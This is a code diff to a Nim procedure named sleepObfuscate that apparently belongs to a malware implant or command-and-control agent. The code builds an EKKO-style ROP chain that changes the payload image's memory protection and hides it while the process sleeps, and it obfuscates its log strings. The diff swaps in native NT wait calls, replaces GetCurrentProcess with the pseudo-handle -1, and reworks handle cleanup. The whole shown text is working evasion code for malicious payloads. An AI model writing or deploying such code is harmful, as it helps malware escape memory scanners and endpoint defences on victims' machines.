@@ -192,10 +192,10 @@ proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofSt
 
         # ROP Chain
         # ctx[0] contains the call to WaitForSingleObjectEx, which waits for a signal to start and execute the rest of the chain.
-        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
+        ctx[gadget].Rip = cast[DWORD64](NtWaitForSingleObject)
         ctx[gadget].Rcx = cast[DWORD64](hEventStart)
-        ctx[gadget].Rdx = cast[DWORD64](INFINITE)
-        ctx[gadget].R8  = cast[DWORD64](FALSE)
+        ctx[gadget].Rdx = cast[DWORD64](FALSE)
+        ctx[gadget].R8  = cast[DWORD64](NULL)
         inc gadget
 
         # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
@@ -228,7 +228,7 @@ proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofSt
 
         # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
         ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
-        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
+        ctx[gadget].Rcx = cast[DWORD64](cast[HANDLE](-1))
         ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
         ctx[gadget].R8  = cast[DWORD64](FALSE)
         inc gadget
@@ -273,23 +273,33 @@ proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofSt
                 if status != STATUS_SUCCESS: 
                     raise newException(CatchableError, "RtlRegisterWait/NtContinue " & $status.toHex())
 
-        echo protect("[*] Triggering sleep obfuscation.")
+        echo protect("[*] Sleep obfuscation start.")
 
         status = NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
 
-        echo protect("[*] Ending sleep obfuscation.")
+        echo protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
         echo protect("[-] "), err.msg
         
-    finally:
-        # Cleanup 
-        if queue != 0: discard RtlDeleteTimerQueue(queue)
-        if hEventTimer != 0: CloseHandle(hEventTimer)
-        if hEventWait != 0: CloseHandle(hEventWait)
-        if hEventStart != 0: CloseHandle(hEventStart)
-        if hEventEnd != 0: CloseHandle(hEventEnd)
-        if hThread != 0: CloseHandle(hThread)
+    finally:        
+        if hEventTimer != 0: 
+            CloseHandle(hEventTimer)
+            hEventTimer = 0
+        if hEventWait != 0: 
+            CloseHandle(hEventWait)
+            hEventWait = 0
+        if hEventStart != 0: 
+            CloseHandle(hEventStart)
+            hEventStart = 0
+        if hEventEnd != 0: 
+            CloseHandle(hEventEnd)
+            hEventEnd = 0
+        if hThread != 0: 
+            CloseHandle(hThread)
+            hThread = 0
+        if queue != 0: 
+            discard RtlDeleteTimerQueue(queue) 
